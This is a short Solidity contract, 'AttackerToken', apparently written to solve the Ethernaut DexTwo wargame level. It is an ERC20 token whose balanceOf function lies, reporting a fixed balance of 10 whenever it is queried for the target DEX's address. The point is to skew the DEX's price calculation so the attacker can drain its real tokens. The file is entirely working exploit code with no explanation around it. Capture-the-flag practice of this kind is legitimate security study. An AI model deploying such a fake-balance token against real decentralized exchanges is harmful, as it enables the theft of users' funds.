pragma solidity ^0.8.0;

import "./DexTwo.sol";

contract AttackerToken is ERC20 {
    DexTwo dexTwo;
    
    constructor(address dexTwoAddress) ERC20("AttackerToken", "ATK"){
        dexTwo = DexTwo(dexTwoAddress);
        _mint(msg.sender, 1 ether);
    }

    function balanceOf(address account) public override view returns (uint256) {
        if(account == address(dexTwo)){
            return 10;
        }
        return super.balanceOf(account);
    }
}